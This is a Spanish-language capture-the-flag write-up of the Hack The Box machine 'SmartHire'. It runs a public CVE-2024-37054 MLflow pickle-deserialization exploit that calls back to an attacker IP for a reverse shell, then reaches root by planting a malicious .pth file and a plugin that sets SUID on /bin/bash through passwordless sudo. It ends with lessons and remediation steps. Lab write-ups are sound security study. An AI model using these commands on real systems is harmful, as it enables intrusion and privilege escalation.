---
layout: single
classes: wide
title: "SmartHire - Writeup"
date: 2026-05-22
difficulty: Medio
operating_system: Linux
tags:
  - HTB
  - Linux
  - Medio
  - CVE-2024-37054
  - MLflow
  - RCE
  - Pickle
  - Path Hijack
  - SUID
summary: "Explotación de CVE-2024-37054 (MLflow pickle deserialization RCE) a través de subida de CSV malicioso y escalada por path hijack de plugins Python con sudo."
---

## Información general

| Campo | Valor |
|-------|-------|
| Sistema operativo | Linux |
| Dificultad | Medio |
| Tags | `CVE-2024-37054`, `MLflow`, `RCE`, `Pickle Deserialization`, `Path Hijack`, `SUID` |
{: .info-table}

## Reconocimiento

Empezamos con un escaneo completo de puertos para identificar toda la superficie expuesta del objetivo. Queríamos descubrir cuántos servicios estaban abiertos y cuáles podrían ser vectores de ataque.

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -Pn 10.129.41.60 -oG allPorts
```

El escaneo reveló solo dos puertos abiertos: `22/tcp` (SSH) y `80/tcp` (HTTP). Con estos identificados, lanzamos un escaneo más detallado con scripts de enumeración para obtener versiones y banners de cada servicio.

```bash
nmap -p22,80 -sCV 10.129.41.60 -oN targeted
```

Los resultados confirmaron:

- `22/tcp` — OpenSSH 8.9p1 Ubuntu 3ubuntu0.15
- `80/tcp` — nginx 1.18.0 con redirección a `http://smarthire.htb/`

Los indicadores más útiles de esta fase fueron:

- **22/tcp** — SSH OpenSSH 8.9p1, acceso remoto si conseguimos credenciales.
- **80/tcp** — HTTP nginx 1.18.0 con redirección a `smarthire.htb`, obliga a trabajar con virtual host.

El virtual host `smarthire.htb` nos indicaba que debíamos trabajar con nombres de dominio, así que lo agregamos a `/etc/hosts`.

## Enumeración

Analizamos el sitio web con whatweb para identificar tecnologías y posibles puntos de entrada.

```bash
whatweb http://smarthire.htb
```

La web corre sobre nginx 1.18.0 en Ubuntu, con título "Overview | SmartHIRE". Es una aplicación de reclutamiento que permite registro de usuarios.

Creamos un usuario nuevo en la plataforma para explorar la funcionalidad interna.

![Registro de usuario](/images/writeups/smarthire/Pasted image 20260518101949.png)

Accedimos con el usuario que acabábamos de crear.

![Login exitoso](/images/writeups/smarthire/Pasted image 20260518102020.png)

Una vez dentro, descubrimos que la aplicación permite subir archivos `.csv` con una estructura específica para entrenar modelos de ML.

![Subida de CSV](/images/writeups/smarthire/Pasted image 20260518102035.png)

Investigando el comportamiento de la aplicación, vimos que `/upload_hiring_data` entrena un modelo y registra una versión, mientras que `/predict` carga el modelo para hacer predicciones. Esto nos hizo sospechar que detrás había MLflow.

Probamos subir un CSV normal para ver cómo procesaba los datos la aplicación. El sistema lo aceptó y entrenó el modelo sin errores, pero no pudimos extraer información sensible de la respuesta. Necesitábamos un enfoque más agresivo.

Fuzzeamos subdominios con wfuzz para encontrar servicios ocultos detrás de virtual hosts alternativos.

```bash
wfuzz -H "Host: FUZZ.smarthire.htb" --hc 404,403 -c --hh 178 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt http://smarthire.htb
```

Encontramos el subdominio `models.smarthire.htb` que devolvía un `401 Unauthorized`. Lo analizamos con whatweb.

```bash
whatweb http://models.smarthire.htb
```

El encabezado `WWW-Authenticate[mlflow][Basic]` confirmó que se trataba de un servidor MLflow Tracking con autenticación Basic.

Intentamos acceder a `models.smarthire.htb` con credenciales por defecto como admin:admin, pero el panel rechazó la autenticación. Seguimos explorando la aplicación principal.

## Metodología de análisis del vector inicial

El vector de entrada se priorizó en la funcionalidad de subida de archivos CSV de la aplicación SmartHIRE, porque la presencia de un servidor MLflow Tracking en `models.smarthire.htb` sugería que los CSV subidos se usaban para entrenar modelos de ML. En estos escenarios, la deserialización de modelos pickle es un vector de RCE conocido.

El flujo de ataque consistía en: crear un usuario, subir un CSV malicioso que incluyera un pickle contaminado durante el entrenamiento, y disparar la deserialización al hacer una predicción. El exploit de CVE-2024-37054 automatiza exactamente este proceso.

## Investigación de vulnerabilidades

La vulnerabilidad principal que guió la fase de investigación fue:

- **CVE-2024-37054**: Vulnerabilidad de deserialización insegura de pickle en MLflow que permite ejecución remota de código. Al subir un CSV malicioso, el modelo entrenado incluye un pickle contaminado; cuando el servidor lo carga para hacer predicciones, ejecuta el payload del atacante. Esta vulnerabilidad afecta a MLflow cuando permite registro y carga de modelos sin validación del formato de serialización.

Adicionalmente, la escalada se basó en una mala práctica de diseño: un script interno (`mlflowctl.py`) cargaba plugins dinámicamente mediante `site.addsitedir()` desde un directorio donde el usuario `svcweb` tenía permisos de escritura, permitiendo path hijack para ejecución de código como root vía sudo.

## Explotación

La combinación de subida de archivos CSV y MLflow nos llevó directamente a `CVE-2024-37054`, una vulnerabilidad de deserialización de pickle en MLflow que permite ejecución remota de código. Al subir un CSV malicioso, el modelo se entrena incluyendo un pickle contaminado; cuando el servidor lo carga para hacer predicciones, ejecuta nuestro payload.

Clonamos el exploit público.

```bash
git clone https://github.com/ben-slates/CVE-2024-37054.git
```

Ejecutamos el exploit con nuestras credenciales de la aplicación, apuntando al listener en nuestra máquina atacante.

```bash
python3 exploit.py http://smarthire.htb http://models.smarthire.htb 10.10.14.150 4444 --app-username hacker --app-password [REDACTED] --app-login-url http://smarthire.htb/login --upload-url http://smarthire.htb/upload_hiring_data --predict-url http://smarthire.htb/predict
```

El exploit realizó seis pasos: autenticación en la app, generación del payload pickle malicioso, registro del modelo en MLflow, obtención del run ID, subida del pickle contaminado y disparo de la deserialización vía `/predict`. Al finalizar nos indicó que la shell debería haberse conectado.

Abrimos el listener y recibimos la conexión reversa.

```bash
nc -nlvp 4444
```

```bash
svcweb@smarthire:/var/www/smarthire.htb$ whoami
svcweb
```

### User Flag

```bash
svcweb@smarthire:/home$ cat svcweb/user.txt
[REDACTED]
```

## Escalada de privilegios

Con acceso como `svcweb`, listamos los privilegios sudo.

```bash
svcweb@smarthire:/home$ sudo -l
```

`svcweb` podía ejecutar `/usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *` como root sin contraseña.

Examinamos el script y su estructura de plugins.

```bash
svcweb@smarthire:/home$ ls -la /opt/tools/mlflow_ctl/
```

```bash
svcweb@smarthire:/home$ cat /opt/tools/mlflow_ctl/mlflowctl.py
```

```bash
svcweb@smarthire:/home$ ls -la /opt/tools/mlflow_ctl/plugins/
```

El script importa módulos desde `plugins/` usando `site.addsitedir()`, que procesa archivos `.pth`. Encontramos el directorio `plugins/dev/` con permisos de escritura para el grupo `devs` (del cual `svcweb` forma parte). Esto nos permitió hacer path hijack: colocamos un archivo `.pth` malicioso y un `mlflow_actions.py` que ejecutara código arbitrario.

Creamos el archivo `.pth` para que Python agregue nuestro directorio al path.

```bash
svcweb@smarthire:/tmp$ cat > /opt/tools/mlflow_ctl/plugins/dev/evil.pth << 'EOF'
import sys; sys.path.insert(0, '/opt/tools/mlflow_ctl/plugins/dev')
EOF
```

Luego escribimos un `mlflow_actions.py` malicioso que, al ejecutarse, marcara `/bin/bash` con SUID.

```bash
svcweb@smarthire:/tmp$ cat > /opt/tools/mlflow_ctl/plugins/dev/mlflow_actions.py << 'EOF'
import os

def check_status():
    os.system("chmod +s /bin/bash")

def restart():
    os.system("chmod +s /bin/bash")
EOF
```

Ejecutamos el script con sudo para activar el path hijack.

```bash
svcweb@smarthire:/tmp$ sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status
```

Verificamos que el SUID se hubiera aplicado correctamente.

```bash
svcweb@smarthire:/tmp$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1396520 Mar 14  2024 /bin/bash
```

Ejecutamos bash con `-p` para preservar los privilegios y obtener una shell como root.

```bash
svcweb@smarthire:/tmp$ /bin/bash -p
bash-5.1# whoami
root
```

### Root Flag

```bash
bash-5.1# cat /root/root.txt
[REDACTED]
```

## Cadena de explotación

```text
SmartHIRE web app
-> registro de usuario
-> subida de CSV malicioso
-> CVE-2024-37054 (MLflow pickle deserialization)
-> RCE como svcweb
-> sudo en mlflowctl.py
-> path hijack vía .pth malicioso en plugins/dev/
-> mlflow_actions.py con chmod +s /bin/bash
-> /bin/bash -p
-> shell como root
```

## Flags

| Flag | Valor |
|------|-------|
| `user.txt` | `[REDACTED]` |
| `root.txt` | `[REDACTED]` |

## Lecciones técnicas

1. La integración de MLflow sin restricciones de serialización permite deserialización insegura de pickle, lo que equivale a RCE sin autenticación si el endpoint de predicción es público.
2. Los scripts que cargan plugins dinámicamente mediante `site.addsitedir()` desde directorios escribibles por el usuario son vectores de path hijack.
3. El uso de sudo sin contraseña en scripts que importan módulos dinámicamente permite escalada a root si el usuario puede controlar el path de Python.
4. La separación de entornos entre la aplicación web y el panel MLflow debe incluir autenticación fuerte y segmentación de red.

## Conclusión

SmartHire demostró cómo una aplicación web que integra MLflow sin restricciones de serialización puede ser comprometida mediante `CVE-2024-37054` (deserialización de pickle). La escalada a root aprovechó un script interno con plugins cargados dinámicamente vía `site.addsitedir()` y permisos de escritura en el directorio de desarrollo, permitiendo un path hijack que ejecutó código como root a través de sudo.

## Remediación

1. Actualizar MLflow a una versión que parchee CVE-2024-37054 y validar el formato de serialización de modelos antes de cargarlos.
2. No utilizar `site.addsitedir()` con directorios escribibles por usuarios no privilegiados; usar rutas absolutas y validación de integridad de plugins.
3. Restringir el uso de sudo a scripts que no realicen importaciones dinámicas o que verifiquen la integridad de los módulos cargados.
4. Segregar el servidor MLflow Tracking de la aplicación web principal con autenticación fuerte y segmentación de red.
